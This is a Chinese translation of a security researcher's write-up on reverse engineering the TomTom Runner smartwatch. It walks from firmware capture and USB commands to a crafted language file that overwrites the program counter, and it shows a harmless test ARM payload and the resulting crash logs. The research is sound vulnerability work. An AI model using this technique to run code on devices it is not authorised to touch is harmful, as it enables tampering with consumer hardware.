# Pwn掉智能手表的正确姿势

原文链接：http://grangeia.io/2015/11/09/hacking-tomtom-runner-pt1/ part1 part2 part3

> 虽然专业化是很多领域的关键所在，但是我个人认为在信息安全这一领域，过于专业会导致视野狭隘、观点片面。现在我就想让自己尝试那些我不是很喜欢的领域，而这篇文章就是在阐述一个我讨厌了很久的东西：嵌入式硬件逆向工程。

0x00 动机
=====

现在的物联网设备有很多吸引人的地方：

*   **简单的处理器架构：**通常嵌入式固件的硬件和软件，相比一般的通用计算机、操作系统复杂的智能手机/平板电脑，要更简单。
*   **更少的攻击解救措施：**这类的设备通常都缺乏内存保护，比如ASLR,DEP, 堆栈检测等等。
*   **ARM处理器架构：**虽然我有一些x86/x64的逆向经验，但是再次着手，我发现了解ARM也许比了解Intel处理器更重要，因为安卓、IOS、智能手机和平板电脑都是使用的这样的架构。

今年有个很明显的流行词，物联网。撇去流行不说，我认为我们确实已经到了任何电子设备都会生成数据并分享给全世界的地步。

0x01 准备
=====

这次我们来破解这款智能手表

**The TomTom Runner**

![](http://drops.javaweb.org/uploads/images/b3a0de86fdb56f0342e9a797403a7f24d2bef3a2.jpg)

首先要做的第一件事就是给所有这些设备下载了固件，这些设备的固件通常都可以在厂家官网或者用户论坛上找到。

0x02 从外部寻找突破口
=====

选择好了入侵TomTom，接下来就要从一个黑客的角度来研究它了。我们这里不要选择拆这个智能手表，也不要用JTAG或者Debug pins来进行硬件上的入侵。而且感觉TomTom手表应该会有一些保护措施，这个也应该比较困难。

所以，从外部看，我想到了下面这些攻击途径：

*   **GPS：**如果你有HackRF或者类似的无线电外设，你可以通过GPS接收器去攻击这个设备，不过个人感觉，这个没什么意义。
*   **蓝牙：**这个设备有蓝牙界面，运行起来有点像协议层的USB。根据我的研究，只要这个设备蓝牙配对成功，就能像USB那样连接。这个可以用ttblue实现。
*   **USB接口：**这个应该是最常用的手段，我们之后再细谈。

0x03 固件
=====

要入侵任何一台设备的第一步都是获取它的固件包，我是通过看TomTom如何用官方软件给手表固件升级实现的。

![](http://drops.javaweb.org/uploads/images/98c66da174d1991dbb060020d2ba26204009df79.jpg)

用Wireshark同时强迫固件升级可以找到固件的文件目录：

![](http://drops.javaweb.org/uploads/images/442b904318bf6ac0d0ded11fac19d96b1ba79952.jpg)

如果你足够细心的话，你就会发现这就是一个常规的HTTP页面，没有SSL。这点之后还会用到。这里有很多的文件，但是有用的就只有：

*   0x000000F0是主要硬件文件。
*   0x0081000*是语言资源文件（英语/德语等等）。

还有一些其他的文件：设备配置文件，GPS和BLE模块硬件。这两个是加密了的文件，不过没什么意思。

这个最大的文件0x000000F0（将近400kb），应该是主要的固件包。用binwalk固件分析器打开发现了这些东西：

```
$ binwalk -BEH 0x000000F0
DECIMAL       HEXADECIMAL     HEURISTIC ENTROPY ANALYSIS
--------------------------------------------------------------------------------
1024          0x400           High entropy data, best guess: encrypted, size: 470544, 0     low entropy blocks

```

![](http://drops.javaweb.org/uploads/images/0a984713fea02a45195b4293189592986e3b97ef.jpg)

如果你还想进一步破解的话可以用vbindiff比较下这两个不同的固件版本：

![](http://drops.javaweb.org/uploads/images/ce8797c2a9f56d07be46dded5156ad0268cfe7b3.jpg)

注意：

*   文件在16字节blocks中是不同的。
*   有些blocks是和其他不同的blocks交织在一起的。

这就说明这很有可能是在ECB模式中的某种分组密码。现在最常见的16字节密码是AES。

我们过会儿再对固件分析，现在我们看看可以从设备的硬件了解到什么东西。

0x04 硬件
=====

在不打开这个手表的情况下我们怎样了解它的内部信息呢？基本上所有在美国出售RF发射设备都被FCC测试过了，然后FCC会发表一篇报告，这个报告包含了各种丰富的信息和照片：

![](http://drops.javaweb.org/uploads/images/00e2903683c7550bda7ab9214b0a146130b0d899.jpg)

上图包括这些芯片：

*   Micron N25Q032A13ESC40F：**这是一个4MB的串行EEPROM，是这个设备的“硬盘”，所有的exercise file都储存在这里面。
*   Texas Instruments CC2541：**这是个蓝牙芯片。
*   Atmel ATSAM4S8C：**这是这个设备的核心，包含了：
    *   一个Cortex-M4 ARM内核
    *   一个储存了固件和引导装在程序的512kb闪存
    *   128kb的RAM内存

这个GPS芯片焊接在方向键附近。现在我们已经对这个设备的内部有了充分的了解，我们就可以继续入侵了。

0x05 USB通信
=====

为了充分理解相关知识，我在ttwatch上找了一个很好的开源软件，TomTom Windows软件做的事情它绝大部分都可以做到。

我看了下源码，实际上很多智能手表上的USB通信都只是对EEPROM进行简单的读写指令，同时我也找到了很多智能手表有趣而且不可记录的USB指令。其实USB通信非常简单，每个指令都至少包含下面的这些字节：

```
09 02 01 0E

"09" -> Indicates a command to the watch (preamble)
"02" -> Size of message
"01" -> sequence number. Should increment after each command.
"0E" -> Actual command byte (this one formats the EEPROM)

```

![](http://drops.javaweb.org/uploads/images/409d579a9f5acd6547df4f6b8811ed5ab452c617.jpg)

绝大多数智能手表接受或者发出指令都要从之前的4MB EEPROM中读取或写入。ttwatch已经为我们做好了这些，我们可以读，写并列出这些文件：

```
root@kali:~/usb# ttwatch -l
0x00000030: 16072
0x00810004: 4198
0x00810005: 4136
0x00810009: 3968
0x0081000b: 3980
0x0081000a: 4152
0x0081000e: 3957
0x0081000f: 4156
0x0081000c: 4003
0x00810002: 4115
[...]    

root@kali:~/usb# ttwatch -r 0x00f20000
<?xml version="1.0" encoding="UTF-8"?>
<preferences version="1" modified="seg set 21 13:34:28 2015">
    <ephemerisModified>0</ephemerisModified>
    <SyncTimeToPC>1</SyncTimeToPC>
    <SendAnonymousData>1</SendAnonymousData>
    <WatchWindowMinimized>0</WatchWindowMinimized>
    <watchName>lgrangeia</watchName>
    <ConfigURL>https://mysports.tomtom.com/service/config/config.json</ConfigURL>
    <exporters>
    </exporters>
</preferences>

```

我在测试中发现如果你对一个之前在download.tomtom.com看到的固件文件进行写操作，下次你断开手表的USB连接时，这个手表会重启并且刷新文件。

0x06 突破口
=====

首先，我们要查看EEPROM中的每一个文件，包括日志文件，给大家看个例子：

![](http://drops.javaweb.org/uploads/images/591c99ea253439b1759752ca793f8f4b8eee9e3c.jpg)

上面这个文件表明，设备里的蓝牙芯片有自己的固件，并会在MD5验证之后显示出来。

其实我对那些被解析出来的文件很感兴趣，因为这些文件容易修改，而且我认为应该好好利用里面的漏洞。其中有两种符合的文件：运动信息文件和语言文件。

运动文件采用二进制格式（ttbin），同时有一些工具，比如ttwatch，把这些文件转换成其他格式。不过我还是选择放弃运动文件，因为这个智能手表只能生成文件而不会解析文件：有一个界面会向你展示你最近的跑步情况，但设备永远不会打开ttbin文件去读它。

所以还是语言文件要有意思的多，让我们随便看看其中一个：

![](http://drops.javaweb.org/uploads/images/0a8875e93b839478ba18d3c785e3e5c54f2d3037.jpg)

这段数据的结构非常简单：

*   前四个字节是一个32位的整数，用来告诉我们除去前面八个字节后的文件大小，把它叫做sbuf_size；
*   接下来的四个字节也是一个32位的整数，用来说明文件中所包含的ASCII 字符串的数量，叫做num_strings；
*   剩下的文件包括以null结尾的字符串，绝大多数是ASCII字符。有些字符不能打印，大概是一些自定义位图（有些菜单入口有图标，就像飞机上的“飞行模式”选项）。

在很多情况下，解析器都无法对这个文件进行准确的解析，所以我列出了一系列要解决的问题：

*   将字符串格式化：我把每一个单独的字符串都用“%x”替代了；
*   sbuf_size比正确的文件大小要大；
*   num_strings比两个正确的以null结尾的字符串数量要大；
*   字符串中不能含有null。

这个结构很简单，所以我们不需要自动的漏洞检查工具去检测。

接下来的事就很简单了，用电脑上的十六进制编辑器编辑文件，再用ttwatch文件传输选择上传到设备当中：

```
$ cat 00810003.bin | ttwatch -w 0x00810003

```

这里要注意每个文件都对应不同的翻译。我改变了德语文件，然后断开设备的USB连接，并把设备的语言设置为德语，最后将上面的问题解决了一些。

当你试图改变UI语言时这个设备应该会自动重启，当然别的情况也会重启，不过这个还是有些不同，因为在那之后EEPROM(0x00013000)中多了个新文件：

```
$ ttwatch -r 0x00013000
Crashlog - SW ver 1.8.42
R1 = 0x00000000
R2 = 0x00000002
R3 = 0x00000f95
R12 = 0x00000000
LR [R14] = 0x00441939 subroutine call return address
PC [R15] = 0x2001b26c program counter
PSR = 0x41000000
BFAR = 0x010f0040
CFSR = 0x00008200
HFSR = 0x40000000
DFSR = 0x00000000
AFSR = 0x00000000
Batt = 4160 mV
stack hi = 0x000004d4

```

你没有看错！这是崩溃日志！从这个文件我们得到许多有用的东西。比如我们可以得到一些关键寄存器的值，包括程序计数器、R0-R3、R12、一些状态值 、以及电池电量和堆栈大小。通过重启之后重复的一些过程，我们得到了寄存器的一些相同的值，这意味着这个智能手表当中没有使用任何内存随机化的手段。

接着是许多数据表和ARM文档。很快我就从中了解到一个最重要的信息，那就是执行流程从闪存ROM到了ARM区域。这可以从PC（程序计数器）的值中看出。它的值就是保存在RAM中的内存区域。请注意下面这张来自Atmel的数据表：

![](http://drops.javaweb.org/uploads/images/9eb9e8c40b270316838b1f7196c1970c49c103cf.jpg)

因为某种原因，执行从ROM区域跳到了我们装载语言文件区域附近的SRAM，起始地址是0x20000000。如果我们能够控制好我们语言文件的位置或者从正确的方向“推动”程序计数器，我们就能自己控制跳跃到内存区域。

经过一些改动之后，我注意到有两个不同类型的崩溃：第一个是在我选择非法语言文件的时候，第二个是在我从菜单中滚动语言的时候。第二个确实也会导致重启。似乎不管你有没有选择，语言文件都会载入到RAM中。这也给了我另一个想法：我可以改变其他语言文件的内容，看看这是否会对寄存器产生某种影响。

我改变了所有字母B(ASCII码0x42)的语言列表中的下一个语言文件，没有改变sbuf_size的value并把num_strings设置为零。之前的语言文件仍然有6001比特大小的sbuf_size。接着我重启了手表，进入语言菜单滚动了下语言。接着手表崩溃了:

```
Crashlog - SW ver 1.8.42
 R0 = 0x2001b088
 R1 = 0x42424242
 R2 = 0x00000002
 R3 = 0x00000f95
 R12 = 0x00000000
 LR [R14] = 0x00441939 subroutine call return address
 PC [R15] = 0x42424242 program counter
 PSR = 0x60000000
 BFAR = 0xe000ed38
 CFSR = 0x00000001
 HFSR = 0x40000000
 DFSR = 0x00000000
 AFSR = 0x00000000
 Batt = 4190 mV
 stack hi = 0x000004d4

```

看到了么，我们能够控制进入程序计数器的东西！不知怎么的，执行流程跳到了我们控制的地址，也就是说我们可以执行转移到内存的任何一个地方了，这也就代表着我们可以在TomTom中执行任意代码了。

0x06 代码执行
=====

好的，我们现在已经知道如何转移到内存中的任何一个地方了，在一个普通的操作系统中，有很多我们可以做的事情：系统调用、标准库调用等等。但这个设备就没这么好了。

首先我们验证下简单的payload的执行，payload构造可以在汇编中完成。下面是我的第一次尝试：

```
.syntax unified
.thumb    

mov r2, #0x13
mov r3, #0x37    

add r1, r3, r2, lsl #8    

mov r0, #0
bx r0

```

注意一定要指定Thumb指令，因为Cortex-M4只会在Thumb模式下运行。代码的 最后两行跳到了地址0x00000000，这样每次都会导致崩溃，因为ARM处理器会根据bx jump的指令地址最后的标志位选择使用ARM指令还是Thumb指令。现在最低位是0，所以我们使用的是ARM指令。而就像前面刚说的那样，ARM ortex-M4只支持Thumb，所以出错了。

我们可以用交叉编译器工具在一个非ARM Linux系统中解决这个问题。就像这样：

```
$ arm-none-eabi-as -mcpu=cortex-m4 -o first.o first.s

```

这是编译好的代码，用objdump反编译：

```
$ arm-linux-gnueabi-objdump -d first.o    

first.o:     file format elf32-littlearm    

Disassembly of section .text:
00000000 <.text>:
   0:   f04f 0213   mov.w   r2, #19
   4:   f04f 0337   mov.w   r3, #55 ; 0x37
   8:   eb03 2102   add.w   r1, r3, r2, lsl #8
   c:   f04f 0000   mov.w   r0, #0
  10:   4700        bx  r0

```

接下来要做的，是把这个payload放到设备中。我们把这个放到德语文件，然后把用于jump指令的指针(第二个文件中的第四双字)指向它。

下面这张图片是在第二个文件（0x00810003）设置的所有内容：

![](http://drops.javaweb.org/uploads/images/36a374cd7595b2d9d2776df2890585078da417e0.jpg)

第四个双字很明显指向我们的payload，然后我把文件装载到了手表中，像之前那样通过选择语言执行跳转。在又一次崩溃之后，我们得到了这样的的崩溃日志（请注意第1、2、3行）：

```
Crashlog - SW ver 1.8.42
 R0 = 0x00000000
 R1 = 0x00001337
 R2 = 0x00000013
 R3 = 0x00000037
 R12 = 0x00000000
 LR [R14] = 0x00441939 subroutine call return address
 PC [R15] = 0x00000000 program counter
 PSR = 0x20000000
 BFAR = 0xe000ed38
 CFSR = 0x00020000
 HFSR = 0x40000000
 DFSR = 0x00000000
 AFSR = 0x00000000
 Batt = 4192 mV
 stack hi = 0x000004d4

```

如上图所示，我们现在就可以在一个在物联网设备的封闭固件中进行任意的代码执行了！